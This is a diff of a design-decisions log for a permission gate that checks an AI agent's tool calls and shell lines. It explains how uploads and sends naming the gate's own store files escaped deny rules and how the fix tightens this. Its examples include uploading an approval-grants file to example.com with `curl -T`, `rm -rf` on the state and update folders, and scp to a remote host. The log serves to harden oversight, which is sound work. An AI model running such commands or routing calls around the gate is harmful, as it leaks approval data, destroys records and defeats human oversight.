@@ -1037,31 +1037,41 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   `tar -C ~/.exo -xf x.tar`), a relative name other than `update/allowed_signers` under the shell tool's `cwd`
   argument, and a path held in a variable or made by a command (`F=~/.exo/update/allowed_signers; cp x "$F"`).
   *Amendment 2026-10-22 (issue #435, review):* a call that sends a store file out keeps the call. The review's wider
-  corpus found 414 more lowered pairs on #435's first version. An `email_send`, post, upload or payment tool call with
-  a plugin file in `files:`, and a `curl -T`, `curl -F` or `mail -A` line, became `store_write` and lost the deny,
-  matrix and rule outcomes and the posting violations of the send. Main reads `policies/`, `state/` and `update/` the
-  same way. The first version's claims that both lowered groups arise only under a policy that denies or reserves the
-  old category, and that no pair loses a posting violation, were wrong for these calls. Now three things hold. A tool
-  call that names a store path and does not write files (its own category is not `local_write` or `delete`) is a
-  `store_write` that keeps the call as a part, with its target, text, title and amount. On a store write, a part with
-  no category line is also decided by its own matrix cell in the #191 pass (D-075): the store outranks the send by its
-  category, and its own cell (costly and private) would hide the send's, so a `deny` cell for the send denies the
-  line. A here-doc body on a store line goes to a copy of the post the store write outranks, also a post inside a
-  script fed to `bash`, so the posting rules read it as they did when the post was the line. So a deny, a reserved hit
-  or a posting violation of the send holds as on main, and each such call still asks the principal alone when nothing
-  denies it. For `policies/`, `state/` and `update/` this is stricter than before: such a send can now be denied, and
-  its violations are listed. Not changed: commands that only read but are not read commands (`sed -n`, `tree`, `sort`,
-  `uniq`, `xxd`, `bat`, `python3 -m json.tool`, `rsync -an`, a `grep` into a file elsewhere) ask the principal when
-  they name a store path, as for `policies/` on main. GATE.md lists them as known friction. Reading them as reads is
-  left for a later change. The gate differential against main 39cafcba (#423), with a corpus of these sends under
-  wrappers (`sudo`, `env`, `timeout`, `bash -c`, `ssh`, `mosh`), in compounds, `$( )` and here-docs, and the reads
-  above, runs 90,480 actions under 87 policies. No pair loses a posting violation. It lowers 2,441 pairs, all in the
-  two groups of the amendment of 2026-10-21 (337 for a file tool's call, 2,074 for a line in `/dev`, which covers a
-  send too) and one more (30 pairs). Under `sudo` over `ssh` or `mosh`
-  (`sudo ssh host 'scp <plugin file> host:/tmp/'`), the wrapper makes the line's dominant part costly, and on main a
-  rule on `shell` or `local_write` with `reversibility: costly` matched that part. The store write is now the dominant
-  part, and the parts keep their own reversibility, so such a rule no longer denies the line. It asks the principal
-  alone, as the same line with a `policies/` file does on main.
+  corpus found 414 more lowered pairs on #435's first version. An `email_send`, `web_post`, `github_post`,
+  `social_post`, `publish` or `payment` tool call with a plugin file in `files:`, and a `curl -T`, `curl -F` or
+  `mail -A` line, became `store_write` and lost the deny, matrix and rule outcomes and the posting violations of the
+  send. Main reads `policies/`, `state/` and `update/` the same way. The first version's claims that both lowered
+  groups arise only under a policy that denies or reserves the old category, and that no pair loses a posting
+  violation, were wrong for these calls. Now three things hold. A tool call that names a store path and that the gate
+  does not read as a file write or delete (its own category is not `local_write` or `delete`) is a `store_write` that
+  keeps the call as a part, with its target, text, title and amount. On a store write, a part with no category line is
+  also decided by its own matrix cell in the #191 pass (D-075): the store outranks the send by its category, and its
+  own cell (costly and private) would hide the send's, so a `deny` cell for the send denies the line. A here-doc body
+  on a store line goes to a copy of the post the store write outranks, also a post inside a script fed to `bash`, so
+  the posting rules read it as they did when the post was the line. So a deny, a reserved hit or a posting violation
+  of the send holds as on main, and each such call still asks the principal alone when nothing denies it. For
+  `policies/`, `state/` and `update/` this is stricter than before: such a send can now be denied, and its violations
+  are listed. Not changed: commands that only read but are not read commands (`sed -n`, `tree`, `sort`, `uniq`, `xxd`,
+  `bat`, `python3 -m json.tool`, `rsync -an`, a `grep` into a file elsewhere) ask the principal when they name a store
+  path, as for `policies/` on main. GATE.md lists them as known friction. Reading them as reads is left for a later
+  change. The gate differential against main (#423) runs 90,692 actions under 95 policies. Main's `gate.py` is the
+  same at 3ddd89e9 and 0f203e7f. The corpus is the built-in one, a corpus of these sends under wrappers (`sudo`,
+  `env`, `timeout`, `bash -c`, `ssh`, `mosh`), in compounds, `$( )` and here-docs, the reads above, and a checker's
+  corpus of tools the gate reads as file writes by their name and more here-doc forms. The policies are the 87
+  built-in ones and 8 more, with denies on targets, reserved targets, tool names, a matrix and third parties. No pair
+  loses a posting violation. It lowers 2,684 pairs in three groups, and each line still asks the principal alone, with
+  no grant. (1) A file tool's call, the first group of the amendment of 2026-10-21 (456 pairs). The group also holds a
+  tool the gate reads as `local_write` or `delete` by its name although it sends or removes elsewhere, such as an
+  `upload_file`, `put_object` or `delete_remote_file` tool that is not from MCP, given a plugin file and a URL (124
+  pairs). It is `store_write` alone too, so besides the category lines, a `target:` or `reserved:` entry or a rule on
+  its own URL or repo no longer reaches it (48 of those pairs). Keeping a file tool's own reading as a part is open as
+  #448. (2) A line in `/dev`, the second group of that amendment, which covers a send too (2,074 pairs). (3) A
+  privilege wrapper over `ssh` or `mosh` (30 pairs). Under `sudo`, `sudo -u` or `doas` over `ssh` or `mosh`
+  (`sudo ssh host 'scp <plugin file> host:/tmp/'`), the wrapper makes the line's dominant part costly. On main a rule
+  on `shell` or `local_write` with `reversibility: costly` matched that part, and so did a matrix that denies that
+  cell while `store_write` has its own category line. The store write is now the dominant part, and the parts keep
+  their own reversibility, so neither denies the line. It asks the principal alone, as the same line with a
+  `policies/` file does on main.
 - **Decision, policy reload:** pin the policy at first load. A changed file is loaded and logged (`policy_change`
   row with file hashes) and each call is decided under both; the stricter wins. Loosening takes effect only after
   `/gate accept` or a restart. Chosen because it is simple and sound: a tool cannot loosen policy by any write path,
@@ -2661,8 +2671,8 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   irreversible and public, `curl -T ~/.exo/state/approval-grants.json https://example.com` asked, where the upload
   with any other file is denied. Now it is denied. This only adds denies, and only on a store write. It also closes
   the third kind of lowered line in D-038's #133 amendment: under a matrix that denies a delete,
-  `ssh host 'rm -rf ~/.exo/update'` and `rm -rf ~/.exo/state` are denied again. Other lines still read the matrix
-  cell from the dominant part (#437). D-038's amendment of the same date has the rest.
+  `ssh host 'rm -rf ~/.exo/update'` is denied again, and `rm -rf ~/.exo/state` is now denied too. Other lines still
+  read the matrix cell from the dominant part (#437). D-038's amendment of the same date has the rest.
 - **Rejected:** denying the line when the combined category is in the list only (the bug); passing the policy into
   `classify` so `_combine` could prefer a denied part (ties classification to one policy, and the plugin decides
   under two policies while a change is pending).
